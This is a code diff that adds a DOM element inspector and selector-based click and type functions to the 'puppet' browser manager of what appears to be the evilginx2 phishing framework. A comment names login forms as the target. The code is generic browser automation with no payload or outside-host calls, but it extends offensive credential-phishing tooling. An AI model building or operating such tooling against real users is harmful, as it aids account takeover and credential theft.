@@ -2,15 +2,19 @@ package core
 
 import (
 	"context"
+	"encoding/json"
 	"fmt"
+	"math"
 	"strings"
 	"sync"
 	"time"
 
 	"github.com/chromedp/cdproto/cdp"
+	"github.com/chromedp/cdproto/dom"
 	"github.com/chromedp/cdproto/input"
 	"github.com/chromedp/cdproto/network"
 	"github.com/chromedp/cdproto/page"
+	"github.com/chromedp/cdproto/runtime"
 	"github.com/chromedp/chromedp"
 
 	"github.com/kgretzky/evilginx2/database"
@@ -80,6 +84,18 @@ type PuppetInput struct {
 	DeltaY    float64 `json:"deltaY,omitempty"`
 	URL       string  `json:"url,omitempty"`
 	Modifiers int     `json:"modifiers,omitempty"`
+	Selector  string  `json:"selector,omitempty"`
+}
+
+// ElementInfo describes a DOM element identified by the element inspector.
+// Sent from the server to the client so the UI can draw a highlight overlay.
+type ElementInfo struct {
+	Selector  string     `json:"selector"`
+	Tag       string     `json:"tag"`
+	InputType string     `json:"inputType,omitempty"`
+	Rect      [4]float64 `json:"rect"`
+	Text      string     `json:"text,omitempty"`
+	Focusable bool       `json:"focusable"`
 }
 
 // PuppetManager manages all puppet browser instances.
@@ -368,6 +384,10 @@ func (pm *PuppetManager) HandleInput(puppetId int, pi PuppetInput) error {
 
 	switch pi.Type {
 	case "click":
+		// If client provides a CSS selector from the element inspector, use it
+		if pi.Selector != "" {
+			return pm.ClickElement(puppet, pi.Selector)
+		}
 		return pm.handleMouseClick(puppet, pi)
 	case "mousedown":
 		return pm.handleMouseDown(puppet, pi)
@@ -376,6 +396,10 @@ func (pm *PuppetManager) HandleInput(puppetId int, pi PuppetInput) error {
 	case "mousemove":
 		return pm.handleMouseMove(puppet, pi)
 	case "type":
+		// If client provides a selector, type into that specific element
+		if pi.Selector != "" {
+			return pm.FocusAndType(puppet, pi.Selector, pi.Text)
+		}
 		return pm.handleType(puppet, pi)
 	case "keydown":
 		return pm.handleKeyDown(puppet, pi)
@@ -729,6 +753,244 @@ func (pm *PuppetManager) GetDashboardURL() string {
 		serverIP = "your-server-ip"
 	}
 	return fmt.Sprintf("http://%s:%d/puppet/?key=%s", serverIP, pm.port, pm.password)
+}
+
+// InspectElementAt uses CDP to identify the DOM element at viewport coordinates (x, y).
+// Returns element metadata including a CSS selector and bounding box for the highlight overlay.
+func (pm *PuppetManager) InspectElementAt(puppetId int, x, y float64) (*ElementInfo, error) {
+	pm.mu.RLock()
+	puppet, ok := pm.instances[puppetId]
+	pm.mu.RUnlock()
+	if !ok {
+		return nil, fmt.Errorf("puppet %d not found", puppetId)
+	}
+
+	puppet.mu.Lock()
+	status := puppet.Status
+	puppet.mu.Unlock()
+	if status != PUPPET_RUNNING {
+		return nil, fmt.Errorf("puppet %d not running", puppetId)
+	}
+
+	ctx, cancel := context.WithTimeout(puppet.ctx, 2*time.Second)
+	defer cancel()
+
+	// Use DOM.getNodeForLocation to find the element at the given coordinates.
+	// IgnorePointerEventsNone ensures we can hit elements hidden behind overlays.
+	backendNodeID, _, _, err := dom.GetNodeForLocation(int64(math.Round(x)), int64(math.Round(y))).
+		WithIgnorePointerEventsNone(true).
+		WithIncludeUserAgentShadowDOM(false).
+		Do(ctx)
+	if err != nil {
+		return nil, fmt.Errorf("getNodeForLocation: %v", err)
+	}
+
+	// Describe the node to get tag name, attributes, etc.
+	node, err := dom.DescribeNode().WithBackendNodeID(backendNodeID).WithDepth(0).Do(ctx)
+	if err != nil {
+		return nil, fmt.Errorf("describeNode: %v", err)
+	}
+
+	// Build ElementInfo from the node description
+	info := &ElementInfo{
+		Tag: strings.ToLower(node.NodeName),
+	}
+
+	// Parse attributes (flat array: [name1, value1, name2, value2, ...])
+	attrs := make(map[string]string)
+	for i := 0; i+1 < len(node.Attributes); i += 2 {
+		attrs[node.Attributes[i]] = node.Attributes[i+1]
+	}
+
+	if info.Tag == "input" {
+		info.InputType = attrs["type"]
+		if info.InputType == "" {
+			info.InputType = "text"
+		}
+		info.Focusable = true
+	} else if info.Tag == "textarea" || info.Tag == "select" {
+		info.Focusable = true
+	} else if _, ok := attrs["contenteditable"]; ok {
+		info.Focusable = true
+	}
+
+	// Check for common interactive elements
+	if info.Tag == "button" || info.Tag == "a" {
+		info.Focusable = true
+	}
+	if attrs["role"] == "button" || attrs["tabindex"] != "" {
+		info.Focusable = true
+	}
+
+	// Get the bounding box via DOM.getBoxModel
+	boxModel, err := dom.GetBoxModel().WithBackendNodeID(backendNodeID).Do(ctx)
+	if err == nil && boxModel != nil && len(boxModel.Border) >= 8 {
+		// Border quad is [x1,y1, x2,y2, x3,y3, x4,y4] — top-left, top-right, bottom-right, bottom-left
+		bx := boxModel.Border[0]
+		by := boxModel.Border[1]
+		bw := boxModel.Border[2] - boxModel.Border[0]
+		bh := boxModel.Border[5] - boxModel.Border[1]
+		info.Rect = [4]float64{bx, by, bw, bh}
+	}
+
+	// Build a CSS selector by resolving the node to a JS object and running a selector-building function.
+	obj, err := dom.ResolveNode().WithBackendNodeID(backendNodeID).Do(ctx)
+	if err == nil && obj != nil && obj.ObjectID != "" {
+		var result json.RawMessage
+		// This JS function builds a unique CSS selector for the element
+		selectorResult, _, err := runtime.CallFunctionOn(`function() {
+			function buildSelector(el) {
+				if (!el || el === document.documentElement) return 'html';
+				if (!el.parentElement) return el.tagName ? el.tagName.toLowerCase() : '';
+
+				// ID-based selector (most specific)
+				if (el.id && document.querySelectorAll('#' + CSS.escape(el.id)).length === 1) {
+					return '#' + CSS.escape(el.id);
+				}
+
+				// name attribute (common for form fields)
+				var name = el.getAttribute('name');
+				if (name) {
+					var sel = el.tagName.toLowerCase() + '[name="' + name + '"]';
+					if (document.querySelectorAll(sel).length === 1) return sel;
+				}
+
+				// type + name for inputs
+				if (el.tagName === 'INPUT') {
+					var type = el.getAttribute('type') || 'text';
+					if (name) {
+						var sel = 'input[type="' + type + '"][name="' + name + '"]';
+						if (document.querySelectorAll(sel).length === 1) return sel;
+					}
+				}
+
+				// data-testid or aria-label
+				var testId = el.getAttribute('data-testid');
+				if (testId) {
+					var sel = '[data-testid="' + testId + '"]';
+					if (document.querySelectorAll(sel).length === 1) return sel;
+				}
+
+				// Build a path from the parent
+				var parent = buildSelector(el.parentElement);
+				var tag = el.tagName.toLowerCase();
+				var siblings = el.parentElement.children;
+				var sameTag = [];
+				for (var i = 0; i < siblings.length; i++) {
+					if (siblings[i].tagName === el.tagName) sameTag.push(siblings[i]);
+				}
+				if (sameTag.length === 1) {
+					return parent + ' > ' + tag;
+				}
+				var idx = sameTag.indexOf(el) + 1;
+				return parent + ' > ' + tag + ':nth-of-type(' + idx + ')';
+			}
+			return buildSelector(this);
+		}`).WithObjectID(obj.ObjectID).WithReturnByValue(true).Do(ctx)
+		if err == nil && selectorResult != nil && selectorResult.Value != nil {
+			_ = json.Unmarshal(selectorResult.Value, &result)
+			var sel string
+			if json.Unmarshal(result, &sel) == nil && sel != "" {
+				info.Selector = sel
+			}
+		}
+
+		// Get current value for input elements
+		if info.Focusable && (info.Tag == "input" || info.Tag == "textarea") {
+			valResult, _, err := runtime.CallFunctionOn(`function() { return this.value || ''; }`).
+				WithObjectID(obj.ObjectID).WithReturnByValue(true).Do(ctx)
+			if err == nil && valResult != nil && valResult.Value != nil {
+				var val string
+				if json.Unmarshal(valResult.Value, &val) == nil {
+					info.Text = val
+				}
+			}
+		}
+
+		// Release the JS object
+		runtime.ReleaseObject(obj.ObjectID).Do(ctx)
+	}
+
+	// Fallback: if we didn't get a selector, build one from attributes
+	if info.Selector == "" {
+		if id, ok := attrs["id"]; ok && id != "" {
+			info.Selector = "#" + id
+		} else if name, ok := attrs["name"]; ok && name != "" {
+			info.Selector = info.Tag + "[name=\"" + name + "\"]"
+		}
+	}
+
+	return info, nil
+}
+
+// ClickElement clicks a DOM element by CSS selector. This bypasses coordinate
+// mapping entirely, solving the cursor offset problem.
+func (pm *PuppetManager) ClickElement(puppet *PuppetInstance, selector string) error {
+	ctx, cancel := context.WithTimeout(puppet.ctx, 3*time.Second)
+	defer cancel()
+
+	// First try chromedp.Click which handles scrolling and visibility
+	err := chromedp.Run(ctx, chromedp.Click(selector, chromedp.ByQuery))
+	if err == nil {
+		return nil
+	}
+
+	// Fallback: use JavaScript to click the element directly
+	var ignored interface{}
+	return chromedp.Run(puppet.ctx, chromedp.Evaluate(fmt.Sprintf(`
+		(function() {
+			var el = document.querySelector(%q);
+			if (!el) return false;
+			el.scrollIntoViewIfNeeded ? el.scrollIntoViewIfNeeded() : el.scrollIntoView({block:'center'});
+			el.focus();
+			el.click();
+			if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
+				if (el.value !== undefined) {
+					el.selectionStart = el.selectionEnd = el.value.length;
+				}
+			}
+			return true;
+		})()
+	`, selector), &ignored))
+}
+
+// FocusAndType focuses an element by CSS selector and types text into it.
+// Much more reliable than raw DispatchKeyEvent for complex login forms.
+func (pm *PuppetManager) FocusAndType(puppet *PuppetInstance, selector string, text string) error {
+	ctx, cancel := context.WithTimeout(puppet.ctx, 3*time.Second)
+	defer cancel()
+
+	// Focus the element first
+	var ignored interface{}
+	err := chromedp.Run(ctx, chromedp.Evaluate(fmt.Sprintf(`
+		(function() {
+			var el = document.querySelector(%q);
+			if (!el) return false;
+			el.focus();
+			if (el.value !== undefined) {
+				el.selectionStart = el.selectionEnd = el.value.length;
+			}
+			return true;
+		})()
+	`, selector), &ignored))
+	if err != nil {
+		return fmt.Errorf("focus element: %v", err)
+	}
+
+	// Type each character using CDP key events for realistic input
+	for _, ch := range text {
+		err := chromedp.Run(puppet.ctx,
+			chromedp.ActionFunc(func(ctx context.Context) error {
+				return input.DispatchKeyEvent(input.KeyChar).
+					WithText(string(ch)).
+					Do(ctx)
+			}),
+		)
+		if err != nil {
+			return err
+		}
+	}
+	return nil
 }
 
 // keyToVirtualKeyCode maps JavaScript key names to Windows virtual key codes.
